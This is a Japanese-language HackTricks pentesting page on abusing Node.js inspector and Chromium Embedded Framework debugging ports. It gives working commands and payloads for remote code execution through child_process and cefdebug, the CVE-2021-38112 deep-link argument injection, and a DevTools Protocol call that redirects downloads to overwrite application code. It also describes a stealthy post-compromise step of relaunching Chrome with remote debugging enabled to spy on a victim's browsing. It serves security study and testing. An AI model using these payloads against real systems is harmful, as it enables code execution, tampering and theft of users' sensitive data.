# Node inspector/CEFデバッグの悪用

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

## 基本情報

`--inspect`スイッチで起動されたNode.jsプロセスは、デバッグクライアントを待ち受けます。**デフォルト**では、ホストとポート**`127.0.0.1:9229`**でリッスンします。各プロセスには、**ユニークな** **UUID**も割り当てられます。

インスペクタークライアントは、接続するためにホストアドレス、ポート、およびUUIDを知っていて指定する必要があります。完全なURLは、`ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`のようになります。

{% hint style="warning" %}
**デバッガーはNode.js実行環境に完全にアクセスできるため**、このポートに接続できる悪意のあるアクターは、Node.jsプロセスに代わって任意のコードを実行する可能性があります（**潜在的な権限昇格**）。
{% endhint %}

インスペクターを起動する方法はいくつかあります：
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
プロセスの検査を開始すると、次のようなものが表示されます：
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
**CEF**（**Chromium Embedded Framework**）をベースにしたプロセスは、デバッガを開くためにパラメータ `--remote-debugging-port=9222` を使用する必要があります（SSRF保護は非常に似ています）。しかし、**NodeJS** **デバッグ**セッションを提供する代わりに、ブラウザと通信するために[**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)を使用します。これはブラウザを制御するためのインターフェースですが、直接的なRCEはありません。

デバッグされたブラウザを起動すると、次のようなものが表示されます：
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### ブラウザ、WebSockets、および同一生成元ポリシー <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

ウェブブラウザで開かれたウェブサイトは、ブラウザのセキュリティモデルの下でWebSocketおよびHTTPリクエストを行うことができます。**初期HTTP接続**が必要です。これは**一意のデバッガーセッションIDを取得するためです**。**同一生成元ポリシー**は、ウェブサイトが**このHTTP接続**を行うことを**防ぎます**。追加のセキュリティとして、Node.jsは**DNSリバインディング攻撃**に対する保護のため、接続の**'Host'ヘッダー**が**IPアドレス**、**`localhost`**、または**`localhost6`**を正確に指定していることを確認します。

{% hint style="info" %}
この**セキュリティ対策は、単にHTTPリクエストを送信することでインスペクターを悪用してコードを実行することを防ぎます**（これはSSRF脆弱性を悪用して行うことができます）。
{% endhint %}

### 実行中のプロセスでインスペクターを開始する

実行中のnodejsプロセスに**シグナルSIGUSR1を送信する**ことで、デフォルトポートで**インスペクターを開始**させることができます。ただし、十分な権限を持っている必要があるため、これによりプロセス内の情報に対する**特権アクセスが付与される**可能性がありますが、直接的な権限昇格にはなりません。
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
これはコンテナで便利です。なぜなら、`--inspect`を付けて**プロセスを終了し、新しいプロセスを開始する**ことは**選択肢ではありません**。なぜなら、**コンテナ**はプロセスと共に**終了される**からです。
{% endhint %}

### インスペクタ/デバッガに接続する

**Chromiumベースのブラウザ**にアクセスできる場合、`chrome://inspect` または Edge で `edge://inspect` にアクセスして接続できます。Configureボタンをクリックし、**ターゲットホストとポート**がリストされていることを確認してください（次のセクションの例を使用してRCEを取得する方法の例を以下の画像で見つけてください）。

![](<../../.gitbook/assets/image (620) (1).png>)

**コマンドライン**を使用して、以下のようにデバッガ/インスペクタに接続できます：
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
ツール [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) は、ローカルで実行されている**インスペクターを見つける**ことと、それらに**コードを注入する**ことができます。
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
**NodeJS RCE** が動作しないことに注意してください。これは [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 経由でブラウザに接続されている場合です（APIをチェックして、それを使って行える興味深いことを見つける必要があります）。
{% endhint %}

## NodeJS デバッガー/インスペクターにおける RCE

{% hint style="info" %}
もし Electron での XSS からの [**RCE を取得する方法を探している場合は、このページをご覧ください。**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
{% endhint %}

Node **インスペクター**に**接続**できる場合に **RCE** を取得する一般的な方法は以下のようなものです（これは **Chrome DevTools protocol への接続では動作しない**ようです）：
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Chrome DevTools Protocol ペイロード

APIはこちらで確認できます: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
このセクションでは、このプロトコルを利用して人々がどのような興味深いことを行ったかをリストアップします。

### ディープリンクを介したパラメータインジェクション

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) で Rhino security は、CEFに基づいたアプリケーションがシステムにカスタムURI（workspaces://）を登録し、受け取った完全なURIを使用して、そのURIから部分的に構成された設定で **CEFベースのアプリケーションを起動**することを発見しました。

URIパラメータがURLデコードされてCEFベーシックアプリケーションを起動するために使用され、ユーザーが **コマンドライン** に **`--gpu-launcher`** フラグを **インジェクト** して任意のことを実行できることが判明しました。

したがって、ペイロードは次のようになります：
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
実行するとcalc.exeが起動します。

### ファイルの上書き

**ダウンロードされたファイルが保存されるフォルダ**を変更し、アプリケーションの頻繁に使用される**ソースコード**をあなたの**悪意のあるコード**で**上書き**するためのファイルをダウンロードします。
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### Webdriver RCEと情報流出

この投稿によると: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) theriverから内部ページをRCEと情報流出することが可能です。

### 侵害後の活動

実際の環境で、Chrome/Chromiumベースのブラウザを使用するユーザーPCを**侵害した後**、**デバッグを有効にしてChromeプロセスを起動し、デバッグポートをポートフォワード**することができます。これにより、Chromeで被害者が行うすべての操作を**検査し、機密情報を盗む**ことができます。

ステルスな方法は、**すべてのChromeプロセスを終了**させ、次のようなものを呼び出すことです
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## 参考文献

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
